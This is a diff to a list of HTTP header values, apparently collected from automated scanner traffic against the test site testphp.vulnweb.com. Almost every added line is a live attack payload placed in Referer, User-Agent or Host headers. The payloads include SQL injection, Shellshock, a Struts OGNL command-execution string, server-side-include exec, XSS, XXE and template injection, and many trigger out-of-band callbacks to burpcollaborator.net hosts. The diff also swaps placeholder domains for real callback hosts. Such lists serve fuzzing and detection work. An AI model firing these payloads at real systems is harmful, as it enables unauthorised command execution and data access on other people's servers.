@@ -11,21 +11,187 @@ Directory/File Searching:
 
 Headers:
     2Bh25HX2: 2Bh25HX2
+    3MGOC1BT: 3MGOC1BT
+    3vKAnnsk: 3vKAnnsk
+    9S: H"
     Accept: */*
+    Accept: ../../../../../../../../../../../../../e*c/h*s*s{{
+    Accept-Encoding: gzip, deflate
+    Accept: image/webp,*/*
+    Accept-Language: en
+    Accept-Language: en-US,en;q=0.5
     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
     awt: p
+    bes: x
+    Cache-Control: max-age=0
+    Cache-Control: no-cache, no-transform
     Connection: close
     Connection: keep-alive
+    Content-Length: 10
+    Content-Length: 102
+    Content-Length: 110
+    Content-Length: 112
+    Content-Length: 114
+    Content-Length: 115
+    Content-Length: 116
+    Content-Length: 119
+    Content-Length: 121
+    Content-Length: 123
+    Content-Length: 124
+    Content-Length: 126
+    Content-Length: 127
+    Content-Length: 128
+    Content-Length: 130
+    Content-Length: 132
+    Content-Length: 133
+    Content-Length: 135
+    Content-Length: 137
+    Content-Length: 141
+    Content-Length: 142
+    Content-Length: 151
+    Content-Length: 1675
+    Content-Length: 175
+    Content-Length: 182
+    Content-Length: 191
+    Content-Length: 193
+    Content-Length: 194
+    Content-Length: 195
+    Content-Length: 197
+    Content-Length: 198
+    Content-Length: 199
+    Content-Length: 212
+    Content-Length: 219
+    Content-Length: 221
+    Content-Length: 24
+    Content-Length: 25
+    Content-Length: 27
+    Content-Length: 273
+    Content-Length: 278
+    Content-Length: 28
+    Content-Length: 29
+    Content-Length: 292
+    Content-Length: 30
+    Content-Length: 31
+    Content-Length: 311
+    Content-Length: 316
+    Content-Length: 32
+    Content-Length: 327
+    Content-Length: 33
+    Content-Length: 331
+    Content-Length: 34
+    Content-Length: 35
+    Content-Length: 360
+    Content-Length: 365
+    Content-Length: 37
+    Content-Length: 40
+    Content-Length: 41
+    Content-Length: 43
+    Content-Length: 44
+    Content-Length: 46
+    Content-Length: 47
+    Content-Length: 48
+    Content-Length: 49
+    Content-Length: 50
+    Content-Length: 51
+    Content-Length: 52
+    Content-Length: 53
+    Content-Length: 54
+    Content-Length: 55
+    Content-Length: 56
+    Content-Length: 57
+    Content-Length: 58
+    Content-Length: 59
+    Content-Length: 60
+    Content-Length: 61
+    Content-Length: 62
+    Content-Length: 64
+    Content-Length: 65
+    Content-Length: 66
+    Content-Length: 67
+    Content-Length: 68
+    Content-Length: 69
+    Content-Length: 72
+    Content-Length: 75
+    Content-Length: 81
+    Content-Type: ${#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("X-Ack",9968*8375)}.multipart/form-data
+    Content-Type: application/xml
+    Content-Type: application/x-www-form-urlencoded
+    Content-Type: text/xml
     Cookie: g4whg395b3
+    Cookie: rl192l6i4m
+    DNT: 1
     fwd: o
+    Host: 299p6azufec8qhnhwe2jgk5tokudi36v8jy6oud.burpcollaborator.net
+    Host: 2psroq87jm8k9by5nkruqw18izosci0a2ysli97.burpcollaborator.net
     Host: testphp.vulnweb.com
+    Host: testphp.vulnweb.com:80@6pwtmefyvisc6l3lciinwolx4oahy7m0co2bszh.burpcollaborator.net
+    Host: testphp.vulnweb.com:80@efx1cm56lqikwttt2q8vmwb5uw0pofc82wsji77.burpcollaborator.net
     iw4zIUbq: iw4zIUbq
+    JqsiAAhV: JqsiAAhV
+    msd: j
+    ncx: m
     Origin: http://testphp.vulnweb.com
     Origin: null
     Pragma: no-cache
+    Referer: 
+    Referer: () { _; } >_[$($())] { /bin/sleep 11; }
+    Referer: ${4645*5959}
+    Referer: $(sleep 11)
+    Referer: 0stnp8isycv69f6ffclhzior7idb11pthhc43ss
+    Referer: 2613*3975
+    Referer: @(5897*2449)
+    Referer: %{9737*6406}
+    Referer: a'a\'b"c>?>%}}%%>c<[[?${{%}}cake\
+    Referer: () { :;}; /bin/sleep 0
+    Referer: () { :;}; /bin/sleep 11
+    Referer: blep08ww6x
+    Referer: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ping 4fkkk3avacn9c0s7jhlx6u7ic9iz6o.burpcollaborator.net -c1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
+    Referer: dmta1{{167*890}}e90q3
     Referer: eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))
     Referer: ez8wu${115*662}giw4k
+    Referer: http://2svppaiuyev89h6hfeljzkot7kdd13ptdo0fo4.burpcollaborator.net/
+    Referer: http://8dmxcwwd7swqxhmbbqf0e2pe65cy0oohccz3ns.burpcollaborator.net/
+    Referer: http://azy2gnbfgp.com/
+    Referer: Http://dn40kld5tpqj4s1sapguuvj42v8owek7mvhi86x.burpcollaborator.net/
+    Referer: Http://jm98l75og3516svmk1obndypfgl99zxszgu3lra.burpcollaborator.net/
     Referer: http://lGlYKgGNczcdMhx.com/
+    Referer: https://3swsrrb8mnblcc16qluvtx49l0rtfj3ar5ew2l.burpcollaborator.net/
+    Referer: https://dj00gl95ppmj0sxs6pcuqvf4yv4oseg742rtfi.burpcollaborator.net/
+    Referer: https://example.com/
+    Referer: https://example.com/"
+    Referer: https://example.com/'
+    Referer: https://example.com/>
+    Referer: https://example.com/{${sleep(20)}}
+    Referer: https://example.com/$zq=%3c%61%60%27%22%24%7b%7b%5c&zq%3d
+    Referer: https://example.com/',0)waitfor delay'0:0:20'--
+    Referer: https://example.com/37994821' or '2041'='2041
+    Referer: https://example.com/63225243' or 1724=1730-- 
+    Referer: https://example.com/68785602' or '5753'='5755
+    Referer: https://example.com/92952773' or 3438=3438-- 
+    Referer: https://example.com/' and 1020=1020-- 
+    Referer: https://example.com/' and '1032'='1032
+    Referer: https://example.com/' and 1735=1744-- 
+    Referer: https://example.com/' and '9313'='9316
+    Referer: https://example.com/' and (select*from(select(sleep(20)))a)-- 
+    Referer: https://example.com/;declare @q varchar(99);set @q='\\69dt6ezyficcqlnlwi2ngo5xoouhi76ywmr9ix7.burpcollab'+'orator.net\dks'; exec master.dbo.xp_dirtree @q;-- 
+    Referer: https://example.com/);declare @q varchar(99);set @q='\\iug5rqka0uxobx8xhunz10q990ft3jrajyel59u.burpcollab'+'orator.net\zse'; exec master.dbo.xp_dirtree @q;-- 
+    Referer: https://example.com/');declare @q varchar(99);set @q='\\nb2a8v1fhzets2p2yz44i57eq5wyko8f13wqnec.burpcollab'+'orator.net\qud'; exec master.dbo.xp_dirtree @q;-- 
+    Referer: https://example.com/';declare @q varchar(99);set @q='\\sqmfn0gkw4ty7747d4j9xamj5ab3ztnke89v0jp.burpcollab'+'orator.net\qhx'; exec master.dbo.xp_dirtree @q;-- 
+    Referer: https://example.com/'+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))+'
+    Referer: https://example.com/'+(function(){if(typeof g3m6r==="undefined"){var a=new Date();do{var b=new Date();}while(b-a<20000);g3m6r=1;}}())+'
+    Referer: https://example.com/hhfj3%>wuww3'/"<a34kh
+    Referer: https://example.com/}}jegy1'/"<za5bu
+    Referer: https://example.com/qpa341bn5y
+    Referer: https://example.com/'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % ekspk SYSTEM "http://cfvzck54loiiwrtr2o8tmub3uu0nodch0cn3bs.burpcollab'||'orator.net/">%ekspk;]>'),'/l') from dual)||'
+    Referer: https://example.com/'(select*from(select(sleep(20)))a)'
+    Referer: https://example.com/'+(select*from(select(sleep(20)))a)+'
+    Referer: https://example.com/,(select*from(select(sleep(20)))a)
+    Referer: https://example.com/'+(select load_file('\\\\8t2vqgj0zkwean7ngkmp0qpz8qej29q0toobfz4.burpcollaborator.net\\caf'))+'
+    Referer: https://example.com/'.sleep(20).'
+    Referer: https://example.com/'+sleep(20.to_i)+'
+    Referer: https://example.com/%}vklp9'/"<k5eek
+    Referer: https://example.com/' waitfor delay'0:0:20'--
+    Referer: https://example.com/')waitfor delay'0:0:20'--
     Referer: http://testphp.vulnweb.com/
     Referer: http://testphp.vulnweb.com/"
     Referer: http://testphp.vulnweb.com/'
@@ -42,36 +208,171 @@ Headers:
     Referer: http://testphp.vulnweb.com/' and '8212'='8215
     Referer: http://testphp.vulnweb.com/' and 9348=9349-- 
     Referer: http://testphp.vulnweb.com/' and (select*from(select(sleep(20)))a)-- 
-    Referer: http://testphp.vulnweb.com/;declare @q varchar(99);set @q='\\c7k160qh1wqurlgf5u9486ji0962usij873uuij.ABC'+'tor.net\vci'; exec master.dbo.xp_dirtree @q;-- 
-    Referer: http://testphp.vulnweb.com/';declare @q varchar(99);set @q='\\gcw5b4vl60vywpljaye8daom5db6zwnneb9y0mp.ABC'+'tor.net\cvo'; exec master.dbo.xp_dirtree @q;-- 
-    Referer: http://testphp.vulnweb.com/');declare @q varchar(99);set @q='\\o4td3cnty8n6oxdr266g5iguxl3er4fv8j36uuj.ABC'+'tor.net\vwz'; exec master.dbo.xp_dirtree @q;-- 
-    Referer: http://testphp.vulnweb.com/);declare @q varchar(99);set @q='\\pohend7ui9778yxsm7qhpj0vhmnfb5zwrkm7dv2.ABC'+'tor.net\vuk'; exec master.dbo.xp_dirtree @q;-- 
+    Referer: http://testphp.vulnweb.com/;declare @q varchar(99);set @q='\\c7k160qh1wqurlgf5u9486ji0962usij873uuij.burpcollab'+'orator.net\vci'; exec master.dbo.xp_dirtree @q;-- 
+    Referer: http://testphp.vulnweb.com/';declare @q varchar(99);set @q='\\gcw5b4vl60vywpljaye8daom5db6zwnneb9y0mp.burpcollab'+'orator.net\cvo'; exec master.dbo.xp_dirtree @q;-- 
+    Referer: http://testphp.vulnweb.com/');declare @q varchar(99);set @q='\\o4td3cnty8n6oxdr266g5iguxl3er4fv8j36uuj.burpcollab'+'orator.net\vwz'; exec master.dbo.xp_dirtree @q;-- 
+    Referer: http://testphp.vulnweb.com/);declare @q varchar(99);set @q='\\pohend7ui9778yxsm7qhpj0vhmnfb5zwrkm7dv2.burpcollab'+'orator.net\vuk'; exec master.dbo.xp_dirtree @q;-- 
     Referer: http://testphp.vulnweb.com/'+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))+'
     Referer: http://testphp.vulnweb.com/'+(function(){if(typeof ndsa5==="undefined"){var a=new Date();do{var b=new Date();}while(b-a<20000);ndsa5=1;}}())+'
     Referer: http://testphp.vulnweb.com/}}jjw94'/"<bgj8s
+    Referer: http://testphp.vulnweb.com/listproducts.php?cat=1
     Referer: http://testphp.vulnweb.com/%}n6k1q'/"<v39jk
-    Referer: http://testphp.vulnweb.com/'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % zpani SYSTEM "http://ao2zny7fiu7s8jxdmsq2p40gh7n0bqzunpagy5.ABC'||'tor.net/">%zpani;]>'),'/l') from dual)||'
+    Referer: http://testphp.vulnweb.com/'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % zpani SYSTEM "http://ao2zny7fiu7s8jxdmsq2p40gh7n0bqzunpagy5.burpcollab'||'orator.net/">%zpani;]>'),'/l') from dual)||'
     Referer: http://testphp.vulnweb.com/'(select*from(select(sleep(20)))a)'
     Referer: http://testphp.vulnweb.com/'+(select*from(select(sleep(20)))a)+'
     Referer: http://testphp.vulnweb.com/,(select*from(select(sleep(20)))a)
-    Referer: http://testphp.vulnweb.com/'+(select load_file('\\\\eas392tj4ytwunjh8wc6b8mk3b94xullo9jwakz.ABCtor.net\\lwj'))+'
+    Referer: http://testphp.vulnweb.com/'+(select load_file('\\\\eas392tj4ytwunjh8wc6b8mk3b94xullo9jwakz.burpcollaborator.net\\lwj'))+'
     Referer: http://testphp.vulnweb.com/'.sleep(20).'
     Referer: http://testphp.vulnweb.com/'+sleep(20.to_i)+'
     Referer: http://testphp.vulnweb.com/tl6g5%>g6s10'/"<hm5nq
     Referer: http://testphp.vulnweb.com/' waitfor delay'0:0:20'--
     Referer: http://testphp.vulnweb.com/')waitfor delay'0:0:20'--
-    Referer: javascript:/*</script><img/onerror='-/"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/i9s786sn32s0tril70baaclo2f88wykqbe61xpmX;.ABCtor.net/).replace(/.;/g,[])]//'src=>
+    Referer: javascript:/*</script><img/onerror='-/"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/929wzhs18l5fjogoplvq9ry0hrnkbaz2qqldc11X;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>
+    Referer: javascript:/*</script><img/onerror='-/"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/i9s786sn32s0tril70baaclo2f88wykqbe61xpmX;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>
+    Referer: krh3<!--esi-->ze7l<!--esx-->lpx9
     Referer: O:3:"PDO":0:{}
-    Referer: (select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % zpani SYSTEM "http://3swsrrb8mnblcc16qluvtx49l0rtfj3mrhe82x.ABC'||'tor.net/">%zpani;]>'),'/l') from dual)
-    Referer: (select load_file('\\\\hsd6r5bmm1bzcq1kqzu9tb4nler7fx3o5c0zrng.ABCtor.net\\erq'))
-    Referer: "-->'-->`--><!--#set var="fqs" value="epr3o28jjy"--><!--#set var="hsu" value="grt5q4all0"--><!--#echo var="fqs"--><!--#echo var="hsu"--><!--#exec cmd="nslookup -q=cname 1ceqbpv66lvjwal4ajetdvo75ybrzhn9lxgk78w.ABCtor.net" -->
-    Referer: '"><svg/onload=fetch`//ii47h61nc\.ABCtor.net`>
+    Referer: otw3c7xmbw3`z'z"${{%{{\
+    Referer: (select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % ekspk SYSTEM "http://a4fx1iu2am7glpiprmxrbs01jspldb1ep9c00p.burpcollab'||'orator.net/">%ekspk;]>'),'/l') from dual)
+    Referer: (select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % zpani SYSTEM "http://3swsrrb8mnblcc16qluvtx49l0rtfj3mrhe82x.burpcollab'||'orator.net/">%zpani;]>'),'/l') from dual)
+    Referer: (select load_file('\\\\9q0wnhg1wltf7o4odljqxrm05rbkzan1ppkcb00.burpcollaborator.net\\fsj'))
+    Referer: (select load_file('\\\\hsd6r5bmm1bzcq1kqzu9tb4nler7fx3o5c0zrng.burpcollaborator.net\\erq'))
+    Referer: "-->'-->`--><!--#set var="dtw" value="csvzpki4yo"--><!--#set var="fvy" value="eux1rmk60q"--><!--#echo var="dtw"--><!--#echo var="fvy"--><!--#exec cmd="nslookup -q=cname zfimc75rlbi5wete2b8gmhbquh0ao0csag53wrl.burpcollaborator.net" -->
+    Referer: "-->'-->`--><!--#set var="fqs" value="epr3o28jjy"--><!--#set var="hsu" value="grt5q4all0"--><!--#echo var="fqs"--><!--#echo var="hsu"--><!--#exec cmd="nslookup -q=cname 1ceqbpv66lvjwal4ajetdvo75ybrzhn9lxgk78w.burpcollaborator.net" -->
+    Referer: `sleep 11`
+    Referer: '"><svg/onload=fetch`//bq5ynjg3wnth7q4qdnjsxtm25tbmzcn4ds8fz3o\.burpcollaborator.net`>
+    Referer: '"><svg/onload=fetch`//ii47h61nc2102rrlg0kajcuobfh85ytqjee15pu\.burpcollaborator.net`>
     Referer: TzozOiJQRE8iOjA6e30=
+    Referer: v0vl''eogr
     Referer: v51k4jo0zfodp4ey3d7n6ph1ys4lsbg38r3eu2j
     Referer: vfxgk{{889*983}}t0xpu
+    Referer: we49a${239*787}fz1sf
+    Referer: {!xmlparser v='<!DOCTYPE a SYSTEM "http://agufyt1mokl2uxe4i8um0vmnze54tt.burpcollaborator.net/xxe"><a></a>'}
     Referer: y6ax6ymhty
+    tnm: o
+    Transfer-Encoding: 1AycmRx6
+    Transfer-Encoding: BW4S5bC5
+    Transfer-Encoding: chunked
+    Transfer-Encoding: cLPCNAei
+    Transfer-Encoding: rdQnne1q
+    Transfer-Encoding: VrzND3Yk
+    Transfer-Encoding: wROFQDyF
+    User-Agent: () { _; } >_[$($())] { /bin/sleep 11; }
+    User-Agent: ${4325*4225}
+    User-Agent: $(sleep 11)
+    User-Agent: 3c5y<!--esi-->e6v1<!--esx-->6d8b
+    User-Agent: @(6638*9235)
+    User-Agent: 7785*3798
+    User-Agent: %{8656*3193}
+    User-Agent: 8oxxnw7dis7q8hxbmqq0p20eh5nybozgr4mrcf1
+    User-Agent: a'a\'b"c>?>%}}%%>c<[[?${{%}}cake\
+    User-Agent: () { :;}; /bin/sleep 0
+    User-Agent: () { :;}; /bin/sleep 11
+    User-Agent: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ping jre1gro4e7dlg1anwsmc7jg7eyko8d.burpcollaborator.net -c1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
+    User-Agent: eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))
+    User-Agent: g7ee7{{248*733}}sy2vd
+    User-Agent: http://58bs5dyxehbbpkmkvh1mfn4wnntgh65wtrgh46.burpcollaborator.netMozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
+    User-Agent: http://zuxotnd4ojdhe832shwrvt65nwtphf55t0gq4f.burpcollaborator.netMozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0
+    User-Agent: i5z7e{{468*850}}kyg54
+    User-Agent: izl7y6int2i0jr8lx01a0cbosfy8myaqyllb90.burpcollaborator.net
+    User-Agent: javascript:/*</script><img/onerror='-/"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/cdt1c0wh7wwuxlmfbuf4e6pi69c20sokf8av0jpX;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>
+    User-Agent: javascript:/*</script><img/onerror='-/"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/d4i01lu5ap7jlsisrpxubv04jvpode16sunhd52X;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>
+    User-Agent: lnir6gr6y6
+    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+    User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0>
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0{${sleep(20)}}
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0',0)waitfor delay'0:0:20'--
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.019533645' or 7199=7199-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.02hkzpj5i7q
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.046982895' or '5584'='5593
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.062369934' or '4075'='4075
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.083564242' or 5259=5260-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0}}ab9hy'/"<i8eez
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' and '2219'='2220
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' and 3976=3982-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' and 5366=5366-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' and '6641'='6641
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' and (select*from(select(sleep(20)))a)-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0;declare @q varchar(99);set @q='\\2adr9qt74mtkubj58kcubwm83z9sxil9bx6kw8l.burpcollab'+'orator.net\jyq'; exec master.dbo.xp_dirtree @q;-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0');declare @q varchar(99);set @q='\\do52n17iix7v8mxgmvq5p70jhan3btzks8nvdj2.burpcollab'+'orator.net\lxx'; exec master.dbo.xp_dirtree @q;-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0);declare @q varchar(99);set @q='\\l1na09kqv5k3luaoz33d2fdrui0bo1cs4gz3pre.burpcollab'+'orator.net\dhf'; exec master.dbo.xp_dirtree @q;-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0';declare @q varchar(99);set @q='\\vihkhj10cf1d24rygdknjpu1bshl5bt2kqfd51u.burpcollab'+'orator.net\jqa'; exec master.dbo.xp_dirtree @q;-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0'+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))+'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0'+(function(){if(typeof azljf==="undefined"){var a=new Date();do{var b=new Date();}while(b-a<20000);azljf=1;}}())+'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % jtagz SYSTEM "http://jg38f7zoa3z10spme1ibhdsp9gf93zr3fy2oqd.burpcollab'||'orator.net/">%jtagz;]>'),'/l') from dual)||'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0'(select*from(select(sleep(20)))a)'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0'+(select*from(select(sleep(20)))a)+'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0,(select*from(select(sleep(20)))a)
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0'+(select load_file('\\\\mf5beayr96y4zvopd4heggrs8jec22qttho4es3.burpcollaborator.net\\njz'))+'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0'.sleep(20).'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0'+sleep(20.to_i)+'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' waitfor delay'0:0:20'--
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0')waitfor delay'0:0:20'--
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0zjp1d%>izwm2'/"<o0pds
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0%}zw23i'/"<bblvu
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0>
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0{${sleep(20)}}
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0$zq=%3c%61%60%27%22%24%7b%7b%5c&zq%3d
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0',0)waitfor delay'0:0:20'--
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.025377098' or '9066'='9073
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.032199297' or 8785=8789-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.076283760' or '4549'='4549
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.091036056' or 5436=5436-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0' and 6715=6715-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0' and '8240'='8240
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0' and '9247'='9252
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0' and 9309=9311-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0' and (select*from(select(sleep(20)))a)-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0bf3fi%>rmw3s'/"<osw76
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0}}bq008'/"<fu5qq
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0%}ccl10'/"<zq1bv
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0);declare @q varchar(99);set @q='\\1hjoe97tndk7ygvg4daiojdswj2cq2et6h14rsg.burpcollab'+'orator.net\ekl'; exec master.dbo.xp_dirtree @q;-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0;declare @q varchar(99);set @q='\\3ptqmbfvvfs96i3icfikwllu4laey4mvcj76xum.burpcollab'+'orator.net\wmw'; exec master.dbo.xp_dirtree @q;-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0';declare @q varchar(99);set @q='\\qlfdiybir2ow25z582e7s8hh0861urii964tuhj.burpcollab'+'orator.net\fie'; exec master.dbo.xp_dirtree @q;-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0');declare @q varchar(99);set @q='\\xz0kw5pp5923gcdcm9se6fvoefk88ywppdk0aoz.burpcollab'+'orator.net\nlx'; exec master.dbo.xp_dirtree @q;-- 
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0'+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))+'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0'+(function(){if(typeof rkqb5==="undefined"){var a=new Date();do{var b=new Date();}while(b-a<20000);rkqb5=1;}}())+'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % ifeht SYSTEM "http://t71g41xld5azo8l8u50aeb3kmbs4gu4ystfj38.burpcollab'||'orator.net/">%ifeht;]>'),'/l') from dual)||'
